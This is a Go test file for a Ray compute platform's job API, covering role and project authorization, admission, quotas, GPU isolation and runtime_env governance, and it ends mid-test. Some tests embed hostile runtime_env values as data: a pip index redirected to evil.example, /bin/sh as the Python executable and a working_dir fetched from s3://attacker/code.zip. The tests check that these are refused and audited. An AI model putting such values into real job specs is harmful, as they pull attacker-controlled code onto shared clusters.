package api

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/bifrost-compute/bifrost/internal/auth"
	"github.com/bifrost-compute/bifrost/internal/controller"
	"github.com/bifrost-compute/bifrost/internal/core"
	"github.com/bifrost-compute/bifrost/internal/policy"
)

func jobBodyFor(project string) SubmitJobJSONRequestBody {
	return SubmitJobJSONRequestBody{Spec: RayJobSpec{Project: project, Entrypoint: "python -c 1", Image: "rayproject/ray:2.56.0"}}
}

func projectDev(project string) *auth.Identity {
	id := testIdentity("dev-"+project, auth.RoleDeveloper)
	id.ProjectRoles = []auth.RoleScope{{Role: auth.RoleOperator, Scope: "project:" + project}}
	return id
}

func mustSubmit(t *testing.T, s *Server, id *auth.Identity, jobID, project string) RayJobView {
	t.Helper()
	body := jobBodyFor(project)
	if jobID != "" {
		body.Id = &jobID
	}
	resp, err := s.SubmitJob(ctxWithIdentity(id), SubmitJobRequestObject{Body: &body})
	if err != nil {
		t.Fatalf("submit: %v", err)
	}
	view, ok := resp.(SubmitJob201JSONResponse)
	if !ok {
		t.Fatalf("submit response = %T, want 201", resp)
	}
	return RayJobView(view)
}

// The per-role outcomes the A1 stubs pinned, now against the real
// handlers: submit/delete are Developer/Admin writes, get is a read every
// role with job read has, and project-scoped callers are narrowed.
func TestJobHandlersApplyTheJobRule(t *testing.T) {
	s := &Server{Store: newMemStore(t)}
	admin := testIdentity("admin", auth.RoleAdmin)
	operator := testIdentity("op", auth.RoleOperator)
	viewer := testIdentity("viewer", auth.RoleViewer)
	devA := projectDev("team-a")
	devB := projectDev("team-b")
	mustSubmit(t, s, admin, "job-a", "team-a")

	submit := func(id *auth.Identity, project string) error {
		body := jobBodyFor(project)
		_, err := s.SubmitJob(ctxWithIdentity(id), SubmitJobRequestObject{Body: &body})
		return err
	}
	get := func(id *auth.Identity) error {
		_, err := s.GetJob(ctxWithIdentity(id), GetJobRequestObject{Id: "job-a"})
		return err
	}
	del := func(id *auth.Identity) error {
		_, err := s.DeleteJob(ctxWithIdentity(id), DeleteJobRequestObject{Id: "job-a"})
		return err
	}
	cases := []struct {
		name string
		err  error
		want int
	}{
		{"operator submit (jobs are code)", submit(operator, "team-a"), http.StatusForbidden},
		{"operator get (read)", get(operator), http.StatusOK},
		{"operator delete", del(operator), http.StatusForbidden},
		{"viewer submit", submit(viewer, "team-a"), http.StatusForbidden},
		{"viewer get", get(viewer), http.StatusOK},
		{"viewer delete", del(viewer), http.StatusForbidden},
		{"project dev submits into another project", submit(devA, "team-b"), http.StatusForbidden},
		{"other project's dev get: hidden", get(devB), http.StatusNotFound},
		{"other project's dev delete: hidden", del(devB), http.StatusNotFound},
		{"own project's dev get", get(devA), http.StatusOK},
		{"unknown id", func() error {
			_, err := s.GetJob(ctxWithIdentity(admin), GetJobRequestObject{Id: "nope"})
			return err
		}(), http.StatusNotFound},
	}
	for _, tc := range cases {
		if got := okOr(t, tc.err); got != tc.want {
			t.Errorf("%s = %d (%v), want %d", tc.name, got, tc.err, tc.want)
		}
	}
	if err := submit(devA, "team-a"); err != nil {
		t.Errorf("project dev submits into own project: %v, want 201", err)
	}
	if err := del(devA); err != nil {
		t.Errorf("own project's dev delete: %v, want 202", err)
	}
}

func TestSubmitJobRecordsDefaultsOwnerAndIdempotentId(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store}
	dev := projectDev("team-a")
	dev.Username = strPtr("alice")

	view := mustSubmit(t, s, dev, "", "team-a")
	if len(view.Id) != len("job-")+8 || view.Id[:4] != "job-" {
		t.Errorf("generated id = %q, want job-<8 hex>", view.Id)
	}
	if view.Owner == nil || *view.Owner != "alice" || view.Project != "team-a" || view.SubmittedAt == 0 {
		t.Errorf("view = %+v", view)
	}
	if view.Status != "" || view.DeploymentStatus != "" || view.Cluster != nil || view.GatewayUrl != nil {
		t.Errorf("fresh job must carry no observation: %+v", view)
	}
	stored, _ := store.GetRayJob(context.Background(), core.ClusterId(view.Id))
	if stored == nil || stored.Spec.HeadCpu != "1" || stored.Spec.HeadMemory != "2Gi" || stored.Spec.RayVersion != "2.56.0" ||
		stored.Owner == nil || *stored.Owner != "alice" || stored.Desired != controller.DesiredRunning {
		t.Fatalf("stored = %+v", stored)
	}

	mustSubmit(t, s, dev, "job-x", "team-a")
	body := jobBodyFor("team-a")
	body.Id = strPtr("job-x")
	_, err := s.SubmitJob(ctxWithIdentity(dev), SubmitJobRequestObject{Body: &body})
	if statusOf(t, err) != http.StatusConflict {
		t.Errorf("resubmitting an existing id = %v, want 409", err)
	}
}

func TestSubmitJobRefusesWhatItCannotDeliver(t *testing.T) {
	s := &Server{Store: newMemStore(t), PolicySeed: PolicyConfig{Admission: Admission{AllowedImagePrefixes: []string{"rayproject/"}, MaxWorkers: 2}.SeedRules()}}
	admin := testIdentity("admin", auth.RoleAdmin)
	try := func(mut func(*SubmitJobJSONRequestBody)) int {
		body := jobBodyFor("team-a")
		mut(&body)
		_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
		return okOr(t, err)
	}
	cases := map[string]func(*SubmitJobJSONRequestBody){
		"unknown profile":  func(b *SubmitJobJSONRequestBody) { b.Spec.Profile = strPtr("gpu-small") },
		"storage":          func(b *SubmitJobJSONRequestBody) { b.Spec.Storage = &[]string{"scratch"} },
		"bad id":           func(b *SubmitJobJSONRequestBody) { b.Id = strPtr("Not_Valid") },
		"empty entrypoint": func(b *SubmitJobJSONRequestBody) { b.Spec.Entrypoint = "" },
		"unparseable cpu":  func(b *SubmitJobJSONRequestBody) { b.Spec.HeadCpu = strPtr("lots") },
		"negative ttl":     func(b *SubmitJobJSONRequestBody) { v := int32(-1); b.Spec.TtlSecondsAfterFinished = &v },
		"disallowed image": func(b *SubmitJobJSONRequestBody) { b.Spec.Image = "evil/ray:2.56.0" },
		"no derivable ray": func(b *SubmitJobJSONRequestBody) { b.Spec.Image = "rayproject/ray:latest" },
		"too many workers": func(b *SubmitJobJSONRequestBody) {
			b.Spec.WorkerGroups = &[]WorkerGroup{{Name: "w", Cpu: "1", Memory: "2Gi", MinReplicas: 3, MaxReplicas: 3, Replicas: 3}}
		},
		"incoherent replica": func(b *SubmitJobJSONRequestBody) {
			b.Spec.WorkerGroups = &[]WorkerGroup{{Name: "w", Cpu: "1", Memory: "2Gi", MinReplicas: 2, MaxReplicas: 1, Replicas: 1}}
		},
	}
	for name, mut := range cases {
		if got := try(mut); got != http.StatusBadRequest {
			t.Errorf("%s = %d, want 400", name, got)
		}
	}
	if got := try(func(b *SubmitJobJSONRequestBody) { b.Spec.Profile = strPtr(""); b.Spec.Storage = &[]string{} }); got != http.StatusOK {
		t.Errorf("empty profile/storage = %d, want accepted", got)
	}
}

// A job names a profile the way a cluster does: the catalog fills the
// shape the client left empty and the admission rule sees the result.
func TestSubmitJobExpandsAProfile(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store, PolicySeed: PolicyConfig{Profiles: []core.Profile{smallProfile("team-a")}}}
	admin := testIdentity("admin", auth.RoleAdmin)
	body := SubmitJobJSONRequestBody{Id: strPtr("job-p"), Spec: RayJobSpec{Project: "team-a", Entrypoint: "python -c 1", Profile: strPtr("small")}}
	if _, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body}); err != nil {
		t.Fatalf("submit with profile: %v", err)
	}
	j, _ := store.GetRayJob(context.Background(), "job-p")
	if j == nil || j.Spec.Image != "rayproject/ray:2.9.0" || j.Spec.RayVersion != "2.9.0" || j.Spec.HeadCpu != "1" || len(j.Spec.WorkerGroups) != 1 {
		t.Fatalf("stored spec = %+v, want the profile's shape", j)
	}
	body.Id = strPtr("job-c")
	body.Spec.HeadCpu = strPtr("4")
	_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
	if statusOf(t, err) != http.StatusBadRequest {
		t.Fatalf("conflicting field next to a profile = %v, want 400", err)
	}
	body.Spec.HeadCpu = nil
	body.Spec.Project = "team-b"
	_, err = s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
	if statusOf(t, err) != http.StatusBadRequest {
		t.Fatalf("profile outside its projects = %v, want 400", err)
	}
}

func TestDeleteJobTerminatesThenPurgesOnlyTombstones(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store}
	admin := testIdentity("admin", auth.RoleAdmin)
	ctx := context.Background()
	mustSubmit(t, s, admin, "job-1", "team-a")
	purge := true

	_, err := s.DeleteJob(ctxWithIdentity(admin), DeleteJobRequestObject{Id: "job-1", Params: DeleteJobParams{Purge: &purge}})
	if statusOf(t, err) != http.StatusConflict {
		t.Fatalf("purge of a live job = %v, want 409", err)
	}
	resp, err := s.DeleteJob(ctxWithIdentity(admin), DeleteJobRequestObject{Id: "job-1"})
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := resp.(DeleteJob202Response); !ok {
		t.Fatalf("delete = %T, want 202", resp)
	}
	j, _ := store.GetRayJob(ctx, "job-1")
	if j.Desired != controller.DesiredTerminated {
		t.Fatalf("desired = %s", j.Desired)
	}
	_, err = s.DeleteJob(ctxWithIdentity(admin), DeleteJobRequestObject{Id: "job-1", Params: DeleteJobParams{Purge: &purge}})
	if statusOf(t, err) != http.StatusConflict {
		t.Fatalf("purge before the reconciler saw it gone = %v, want 409", err)
	}
	// The reconciler tombstones it: no cluster, no dashboard, finished.
	now := controller.NowUnix()
	if err := store.RecordRayJobObservation(ctx, "job-1", controller.RayJobObservation{Status: "STOPPED", FinishedAt: &now}); err != nil {
		t.Fatal(err)
	}
	resp, err = s.DeleteJob(ctxWithIdentity(admin), DeleteJobRequestObject{Id: "job-1", Params: DeleteJobParams{Purge: &purge}})
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := resp.(DeleteJob200Response); !ok {
		t.Fatalf("purge = %T, want 200", resp)
	}
	if j, _ := store.GetRayJob(ctx, "job-1"); j != nil {
		t.Fatal("row survived the purge")
	}
	_, err = s.GetJob(ctxWithIdentity(admin), GetJobRequestObject{Id: "job-1"})
	if statusOf(t, err) != http.StatusNotFound {
		t.Fatalf("get after purge = %v, want 404", err)
	}
}

func TestJobAndClusterViewsCarryGatewayURLWhileRegistered(t *testing.T) {
	store := newMemStore(t)
	registry := &core.ClusterRegistry{}
	s := &Server{Store: store, Registry: registry, GatewayExternalBase: "https://"}
	admin := testIdentity("admin", auth.RoleAdmin)
	ctx := context.Background()
	mustSubmit(t, s, admin, "job-1", "team-a")

	view := func() RayJobView {
		resp, err := s.GetJob(ctxWithIdentity(admin), GetJobRequestObject{Id: "job-1"})
		if err != nil {
			t.Fatal(err)
		}
		v, ok := resp.(GetJob200JSONResponse)
		if !ok {
			t.Fatalf("get job response = %T, want 200", resp)
		}
		return RayJobView(v)
	}
	if view().GatewayUrl != nil {
		t.Fatal("unregistered job reports a gateway_url")
	}
	if err := registry.Register(core.ClusterEndpoint{Id: "job-1", Hostname: "job-1.ray.example", ApiBaseUrl: "http://h:8265", Project: "team-a", Target: core.RegistryTargetJobs}); err != nil {
		t.Fatal(err)
	}
	if v := view(); v.GatewayUrl == nil || *v.GatewayUrl != "https://job-1.ray.example" {
		t.Fatalf("gateway_url = %v", v.GatewayUrl)
	}
	registry.Deregister("job-1")
	if view().GatewayUrl != nil {
		t.Fatal("deregistered job still reports a gateway_url")
	}

	// Same for clusters; owner comes from the stamped spec.
	owner := "alice"
	if _, err := store.UpsertDesired(ctx, "c1", core.ClusterSpec{Name: "c1", Project: "team-a", Engine: core.EngineRay,
		RayVersion: "2.56.0", Image: "rayproject/ray:2.56.0", HeadCpu: "1", HeadMemory: "2Gi", Owner: &owner}); err != nil {
		t.Fatal(err)
	}
	if err := registry.Register(core.ClusterEndpoint{Id: "c1", Hostname: "c1.ray.example", ApiBaseUrl: "http://h:8265", Project: "team-a"}); err != nil {
		t.Fatal(err)
	}
	resp, err := s.GetCluster(ctxWithIdentity(admin), GetClusterRequestObject{Id: "c1"})
	if err != nil {
		t.Fatal(err)
	}
	cresp, ok := resp.(GetCluster200JSONResponse)
	if !ok {
		t.Fatalf("get cluster response = %T, want 200", resp)
	}
	cv := ClusterView(cresp)
	if cv.GatewayUrl == nil || *cv.GatewayUrl != "https://c1.ray.example" || cv.Owner == nil || *cv.Owner != "alice" {
		t.Fatalf("cluster view = %+v", cv)
	}

	// No external base: nothing to report, registered or not.
	s.GatewayExternalBase = ""
	if v := view(); v.GatewayUrl != nil {
		t.Fatalf("gateway_url without an external base = %v", *v.GatewayUrl)
	}
}

func TestListRegistryReportsSourceAndTarget(t *testing.T) {
	registry := &core.ClusterRegistry{Clusters: []core.ClusterEndpoint{{Id: "static-1", Hostname: "s.example", ApiBaseUrl: "http://s:8265"}}}
	if err := registry.Register(core.ClusterEndpoint{Id: "svc-1", Hostname: "svc.example", ApiBaseUrl: "http://svc:8000", Project: "team-a", Target: core.RegistryTargetServe}); err != nil {
		t.Fatal(err)
	}
	s := &Server{Registry: registry}
	resp, err := s.ListRegistry(ctxWithIdentity(testIdentity("admin", auth.RoleAdmin)), ListRegistryRequestObject{})
	if err != nil {
		t.Fatal(err)
	}
	entries, ok := resp.(ListRegistry200JSONResponse)
	if !ok {
		t.Fatalf("list registry response = %T, want 200", resp)
	}
	if len(entries) != 2 {
		t.Fatalf("entries = %+v", entries)
	}
	if entries[0].Source == nil || *entries[0].Source != Static || entries[0].Target == nil || *entries[0].Target != Jobs {
		t.Errorf("static entry = %+v", entries[0])
	}
	if entries[1].Source == nil || *entries[1].Source != Dynamic || entries[1].Target == nil || *entries[1].Target != Serve {
		t.Errorf("dynamic entry = %+v", entries[1])
	}
}

// The gateway's host-is-cluster gate authorizes a dynamic entry within its
// project and by its target. The tenant boundary (red-team fix): a global
// role alone — operator reading jobs, viewer reading jobs, operator
// reading serve — does NOT reach a project's entry; the caller must be
// Admin, the recorded owner of the store-backed cluster, or a project
// member (any project-scoped assignment covering the entry's project —
// the r03 principal "dev-a" is a global developer holding operator on
// team-a, and reaches team-a's entries as a member while their developer
// role supplies the verb). Ownership never waives the verb: a viewer who
// owns the cluster still may not submit. A static entry with no tenant
// information keeps the original global check; a static entry whose id IS
// a store-backed cluster is tenant-scoped like a dynamic one.
func TestGatewayAuthorizationIsProjectAndTargetScoped(t *testing.T) {
	store := newMemStore(t)
	devA := projectDev("team-a")
	devB := projectDev("team-b")
	devGlobal := testIdentity("dev-x", auth.RoleDeveloper)
	operator := testIdentity("op", auth.RoleOperator)
	viewer := testIdentity("viewer", auth.RoleViewer)
	// Global developers whose team-a membership is a scoped assignment of
	// the named role — the red-team probe shapes. The tenant boundary is
	// role-aware: only a covering assignment whose role licenses the
	// request's (verb, target) crosses it.
	devRoled := func(role auth.Role) *auth.Identity {
		id := testIdentity("dev-scoped", auth.RoleDeveloper)
		id.ProjectRoles = []auth.RoleScope{{Role: role, Scope: "project:team-a"}}
		return id
	}
	jobsA := core.ClusterEndpoint{Id: "job-1", Hostname: "job-1.gw", ApiBaseUrl: "http://h:8265", Project: "team-a", Target: core.RegistryTargetJobs}
	serveA := core.ClusterEndpoint{Id: "svc-1", Hostname: "svc-1.gw", ApiBaseUrl: "http://h:8000", Project: "team-a", Target: core.RegistryTargetServe}
	static := core.ClusterEndpoint{Id: "s", Hostname: "s.gw", ApiBaseUrl: "http://h:8265"}

	// A static-file entry whose id is a store-backed tenant cluster is
	// scoped by the STORE row (authoritative), even though the entry
	// itself carries no Project — the pre-fix hole this closes.
	owner := "owner-1"
	if _, err := storeAsServer(store).Store.UpsertDesired(context.Background(), "owned", core.ClusterSpec{
		Name: "owned", Project: "team-a", Owner: &owner, RayVersion: "2.9.0", Image: "x", HeadCpu: "1", HeadMemory: "1Gi",
	}); err != nil {
		t.Fatal(err)
	}
	staticOwned := core.ClusterEndpoint{Id: "owned", Hostname: "owned.gw", ApiBaseUrl: "http://h:8265"}

	cases := []struct {
		name     string
		id       *auth.Identity
		method   string
		endpoint core.ClusterEndpoint
		allowed  bool
	}{
		{"own project's dev reads jobs", devA, http.MethodGet, jobsA, true},
		// Red-team fix (gateway tenant split-brain): the boundary is
		// role-aware — devA's operator@team-a carries no Write on Job, so a
		// global developer holding it can no longer submit through team-a's
		// gateway hostname, exactly as clusterTenantAccess refuses the same
		// principal on the API side. Only a covering assignment whose role
		// licenses the verb (developer@team-a) crosses.
		{"global developer + operator member submits (refused)", devA, http.MethodPost, jobsA, false},
		{"global developer + developer member submits", devRoled(auth.RoleDeveloper), http.MethodPost, jobsA, true},
		{"global developer + viewer member submits (refused)", devRoled(auth.RoleViewer), http.MethodPost, jobsA, false},
		{"global developer + viewer member reads", devRoled(auth.RoleViewer), http.MethodGet, jobsA, true},
		// auditor@team-x can no longer be stored (UpsertAssignment refuses
		// it), but a group-derived auditor grant can still exist — it
		// licenses nothing on the job surface either way.
		{"global developer + auditor member is refused", devRoled(auth.RoleAuditor), http.MethodGet, jobsA, false},
		{"other project's dev is refused", devB, http.MethodGet, jobsA, false},
		// Red-team case: a developer with ZERO project memberships must
		// not reach another tenant's cluster through its hostname.
		{"global developer with no project ties is refused", devGlobal, http.MethodPost, jobsA, false},
		// A global role alone never crosses the tenant boundary.
		{"global operator reads jobs", operator, http.MethodGet, jobsA, false},
		{"global operator cannot submit", operator, http.MethodPost, jobsA, false},
		{"viewer reads jobs", viewer, http.MethodGet, jobsA, false},
		{"own project's dev calls serve", devRoled(auth.RoleDeveloper), http.MethodPost, serveA, true},
		{"operator member cannot write serve", devA, http.MethodPost, serveA, false},
		{"other project's dev refused on serve", devB, http.MethodPost, serveA, false},
		{"operator reads serve", operator, http.MethodGet, serveA, false},
		{"static entry keeps the global rule for dev", devB, http.MethodGet, static, true},
		{"static entry refuses a write by an operator", operator, http.MethodDelete, static, false},
		// Store-backed cluster behind a static entry: only the owner (or
		// admin / a team-a member) gets through.
		{"static entry for own cluster: owner reads", testIdentity("owner-1", auth.RoleViewer), http.MethodGet, staticOwned, true},
		{"static entry for own cluster: owner submits as developer", testIdentity("owner-1", auth.RoleDeveloper), http.MethodPost, staticOwned, true},
		{"static entry for foreign cluster: global developer refused", devGlobal, http.MethodGet, staticOwned, false},
		{"static entry for foreign cluster: admin reads", testIdentity("root", auth.RoleAdmin), http.MethodGet, staticOwned, true},
	}
	for _, tc := range cases {
		r := httptest.NewRequest(tc.method, "/api/jobs/", nil)
		err := authorizeGatewayRequest(store, tc.id, r, tc.endpoint)
		if (err == nil) != tc.allowed {
			t.Errorf("%s: err=%v, want allowed=%v", tc.name, err, tc.allowed)
		}
	}
}

// storeAsServer wraps a bare store in a Server for spec seeding.
func storeAsServer(store controller.Store) *Server { return &Server{Store: store} }

// okOr is statusOf tolerating success: 200 for a nil error.
func okOr(t *testing.T, err error) int {
	t.Helper()
	if err == nil {
		return http.StatusOK
	}
	return statusOf(t, err)
}

// A job is admitted by exactly the GPU tenant-isolation rules a same-shape
// cluster is (#58, F1): SubmitJob used to skip CheckClusterGpuIsolation
// entirely, so a fractional GPU a multi-tenant pool would refuse at cluster
// creation sailed through as a job. Mirror of
// clusters_test.go's TestCreateCluster_FractionalGPURejectedInMultiTenantPool.
func TestSubmitJobAppliesGpuTenantIsolation(t *testing.T) {
	store := controller.NewMemoryStore()
	ctx := context.Background()
	if _, err := store.UpsertPool(ctx, "gpu-pool", core.PoolSpec{Name: "gpu-pool", Cohort: "c", Flavors: []core.FlavorSpec{{Name: "f", Resources: map[string]string{"nvidia.com/gpu": "8"}}}}); err != nil {
		t.Fatal(err)
	}
	if err := store.UpsertAllocation(ctx, core.AllocationSpec{Pool: "gpu-pool", Project: "proj-a", Namespace: "ns-a"}); err != nil {
		t.Fatal(err)
	}
	if err := store.UpsertAllocation(ctx, core.AllocationSpec{Pool: "gpu-pool", Project: "proj-b", Namespace: "ns-b"}); err != nil {
		t.Fatal(err)
	}
	s := &Server{Store: store}
	admin := testIdentity("admin", auth.RoleAdmin)

	submitWithGpu := func(jobID, gpu string) error {
		body := jobBodyFor("proj-a")
		body.Id = strPtr(jobID)
		body.Spec.WorkerGroups = &[]WorkerGroup{{Name: "w", Cpu: "1", Memory: "2Gi", Gpu: &gpu, MinReplicas: 0, MaxReplicas: 1}}
		_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
		return err
	}

	// The fractional request is refused with the same 400 class the cluster
	// path returns, naming tenant isolation in the message — and nothing is
	// persisted.
	err := submitWithGpu("job-frac", "0.5")
	mustHTTPError(t, err, http.StatusBadRequest)
	var he HTTPError
	_ = errorsAs(err, &he)
	if !strings.Contains(he.Message, "tenant isolation") {
		t.Errorf("message = %q, want the tenant-isolation refusal", he.Message)
	}
	if j, _ := store.GetRayJob(ctx, "job-frac"); j != nil {
		t.Fatal("an isolation-rejected job must not be persisted")
	}

	// The whole-GPU shape a cluster create would admit is admitted as a job.
	if err := submitWithGpu("job-whole", "1"); err != nil {
		t.Errorf("whole-GPU job in a multi-tenant pool: %v, want admitted", err)
	}

	// A single-tenant pool places no fractional restriction at all.
	store2 := controller.NewMemoryStore()
	if _, err := store2.UpsertPool(ctx, "solo-pool", core.PoolSpec{Name: "solo-pool", Cohort: "c", Flavors: []core.FlavorSpec{{Name: "f", Resources: map[string]string{"nvidia.com/gpu": "8"}}}}); err != nil {
		t.Fatal(err)
	}
	if err := store2.UpsertAllocation(ctx, core.AllocationSpec{Pool: "solo-pool", Project: "proj-solo", Namespace: "ns-solo"}); err != nil {
		t.Fatal(err)
	}
	s2 := &Server{Store: store2}
	body := jobBodyFor("proj-solo")
	body.Spec.WorkerGroups = &[]WorkerGroup{{Name: "w", Cpu: "1", Memory: "2Gi", Gpu: strPtr("0.5"), MinReplicas: 0, MaxReplicas: 1}}
	if _, err := s2.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body}); err != nil {
		t.Errorf("fractional GPU in a single-tenant pool: %v, want admitted", err)
	}
}

// Jobs are admitted against the same project quota and budget as clusters,
// and unfinished jobs count toward the quota clusters and later jobs see.
func TestSubmitJobHonoursQuotaAndBudget(t *testing.T) {
	store := controller.NewMemoryStore()
	ctx := context.Background()
	s := &Server{Store: store, PolicySeed: PolicyConfig{Quotas: map[string]policy.ResourceMap{"team-a": {"cpu": 2, "memory": 8}}}}
	admin := testIdentity("admin", auth.RoleAdmin)

	// A running 1-cpu job plus a running 1-cpu cluster fill the 2-cpu quota.
	mustSubmit(t, s, admin, "job-1", "team-a")
	if _, err := store.UpsertDesired(ctx, "c1", core.ClusterSpec{Name: "c1", Project: "team-a", Engine: core.EngineRay,
		RayVersion: "2.56.0", Image: "rayproject/ray:2.56.0", HeadCpu: "1", HeadMemory: "2Gi"}); err != nil {
		t.Fatal(err)
	}
	body := jobBodyFor("team-a")
	body.Id = strPtr("job-2")
	_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
	if statusOf(t, err) != http.StatusConflict {
		t.Fatalf("over quota = %v, want 409", err)
	}
	if j, _ := store.GetRayJob(ctx, "job-2"); j != nil {
		t.Fatal("a quota-rejected job must not be persisted")
	}
	// A finished job no longer holds its share.
	end := controller.NowUnix()
	if err := store.RecordRayJobObservation(ctx, "job-1", controller.RayJobObservation{Status: "SUCCEEDED", DeploymentStatus: "Complete", FinishedAt: &end}); err != nil {
		t.Fatal(err)
	}
	mustSubmit(t, s, admin, "job-2", "team-a")
	// Another project's quota is not consulted at all.
	mustSubmit(t, s, admin, "job-3", "team-b")

	// Budget: consumption already over the window cap refuses the job. A
	// fresh store, because the first effectivePolicy call seeds the policy
	// row from PolicySeed and later seed edits are ignored by design.
	bstore := controller.NewMemoryStore()
	if err := bstore.RecordUsageSamples(ctx, []controller.UsageSample{
		{Ts: 0, Project: "team-c", Pool: "pool-c", Resource: "cpu", Quantity: 100, Source: controller.UsageSourceObservedSpec},
	}); err != nil {
		t.Fatal(err)
	}
	bs := &Server{Store: bstore, PolicySeed: PolicyConfig{Budgets: map[string]policy.Budget{"team-c": {WindowSecs: 3600, Limits: map[string]float64{"cpu": 50}}}}}
	body = jobBodyFor("team-c")
	_, err = bs.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
	if statusOf(t, err) != http.StatusConflict {
		t.Fatalf("over budget = %v, want 409", err)
	}
}

// A project with a pool allocation gets its jobs admitted through that
// pool's LocalQueue; the view names it.
func TestSubmitJobReportsTheProjectQueue(t *testing.T) {
	store := controller.NewMemoryStore()
	ctx := context.Background()
	if _, err := store.UpsertPool(ctx, "pool-a", core.PoolSpec{Name: "pool-a", Cohort: "c", Flavors: []core.FlavorSpec{{Name: "f", Resources: map[string]string{"cpu": "8"}}}}); err != nil {
		t.Fatal(err)
	}
	if err := store.UpsertAllocation(ctx, core.AllocationSpec{Pool: "pool-a", Project: "team-a", Namespace: "ns-a"}); err != nil {
		t.Fatal(err)
	}
	s := &Server{Store: store}
	view := mustSubmit(t, s, testIdentity("admin", auth.RoleAdmin), "job-q", "team-a")
	if view.Queue == nil || *view.Queue != "team-a" {
		t.Fatalf("queue = %v, want the project's LocalQueue", view.Queue)
	}
	other := mustSubmit(t, s, testIdentity("admin", auth.RoleAdmin), "job-nq", "team-b")
	if other.Queue != nil {
		t.Fatalf("queue for an unallocated project = %q", *other.Queue)
	}
}

func statusOf(t *testing.T, err error) int {
	t.Helper()
	var he HTTPError
	if !errors.As(err, &he) {
		t.Fatalf("error %v is not an HTTPError", err)
	}
	return he.Status
}

// runtime_env governance (#53): a runtime_env_yaml that the platform rule
// set refuses is a 400 with a runtime_env_rejected deny audit row and no
// persisted job; a governed document is admitted and stored verbatim;
// RuntimeEnvUngoverned (the --allow-ungoverned-runtime-env DANGER flag)
// restores the pre-#53 passthrough for upgraders.
func TestSubmitJobGovernsRuntimeEnvYaml(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store}
	admin := testIdentity("admin", auth.RoleAdmin)
	ctx := context.Background()

	submitWithEnv := func(jobID, env string) error {
		body := jobBodyFor("team-a")
		body.Id = strPtr(jobID)
		body.Spec.RuntimeEnvYaml = &env
		_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
		return err
	}

	// The epic's canonical attack: pip_install_options redirecting the
	// package index. Refused, audited, nothing persisted.
	err := submitWithEnv("job-evil", "pip:\n  packages: [torch==2.1.0]\n  pip_install_options: [--index-url, https://evil.example/simple]")
	mustHTTPError(t, err, http.StatusBadRequest)
	rows, _, aerr := store.ListAudit(ctx, core.AuditFilter{})
	if aerr != nil {
		t.Fatal(aerr)
	}
	denied := false
	for _, r := range rows {
		if r.Event.Decision == core.AuditDecisionDeny && r.Event.Reason != nil &&
			*r.Event.Reason == "runtime_env_rejected" && r.Event.Action != nil && *r.Event.Action == "submit_job" {
			denied = true
		}
	}
	if !denied {
		t.Fatal("expected a submit_job audit deny with reason runtime_env_rejected")
	}
	if j, _ := store.GetRayJob(ctx, "job-evil"); j != nil {
		t.Fatal("a refused submit must not persist a job row")
	}

	// A governed document (pinned pip, env_vars, capped timeout, local
	// working_dir) is admitted and rides the stored spec verbatim, exactly
	// as the passthrough carried it before — governance validates, and
	// (#56) only fills the setup timeout a document leaves unset, which
	// this one pins itself.
	legal := "pip: [torch==2.1.0]\nenv_vars:\n  OMP_NUM_THREADS: \"4\"\nconfig:\n  setup_timeout_seconds: 300\nworking_dir: ./src"
	if err := submitWithEnv("job-ok", legal); err != nil {
		t.Fatalf("governed-legal env refused: %v", err)
	}
	stored, _ := store.GetRayJob(ctx, "job-ok")
	if stored == nil || stored.Spec.RuntimeEnvYaml != legal {
		t.Fatalf("stored env = %q, want the submitted document verbatim", stored.Spec.RuntimeEnvYaml)
	}
}

// Bounded setup timeout (#56): a governed document without
// config.setup_timeout_seconds is stored with the policy default injected —
// the bound rides the RayJob CR, so a wedged install fails at the timeout
// instead of hanging forever. A document that pins its own timeout is
// stored verbatim.
func TestSubmitJobInjectsBoundedSetupTimeout(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store}
	admin := testIdentity("admin", auth.RoleAdmin)
	ctx := context.Background()

	submitWithEnv := func(jobID, env string) {
		body := jobBodyFor("team-a")
		body.Id = strPtr(jobID)
		body.Spec.RuntimeEnvYaml = &env
		if _, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body}); err != nil {
			t.Fatalf("submit %s: %v", jobID, err)
		}
	}

	submitWithEnv("job-notimeout", "pip: [numpy==1.26.4]")
	stored, _ := store.GetRayJob(ctx, "job-notimeout")
	if stored == nil {
		t.Fatal("job not persisted")
	}
	if secs, set := setupTimeoutOf(t, stored.Spec.RuntimeEnvYaml); !set || secs != DefaultSetupTimeoutSeconds {
		t.Fatalf("stored env setup timeout = %d (set %v), want the injected %d:\n%s", secs, set, DefaultSetupTimeoutSeconds, stored.Spec.RuntimeEnvYaml)
	}

	pinned := "pip: [numpy==1.26.4]\nconfig:\n  setup_timeout_seconds: 300"
	submitWithEnv("job-pinned", pinned)
	stored, _ = store.GetRayJob(ctx, "job-pinned")
	if stored == nil || stored.Spec.RuntimeEnvYaml != pinned {
		t.Fatalf("stored env = %q, want the caller's pinned timeout verbatim", stored.Spec.RuntimeEnvYaml)
	}
}

func TestSubmitJobRuntimeEnvUngovernedRestoresPassthrough(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store, RuntimeEnvUngoverned: true}
	admin := testIdentity("admin", auth.RoleAdmin)

	evil := "py_executable: /bin/sh\npip:\n  packages: [torch]\n  pip_install_options: [--index-url, https://evil.example/simple]\nworking_dir: s3://attacker/code.zip"
	body := jobBodyFor("team-a")
	body.Id = strPtr("job-raw")
	body.Spec.RuntimeEnvYaml = &evil
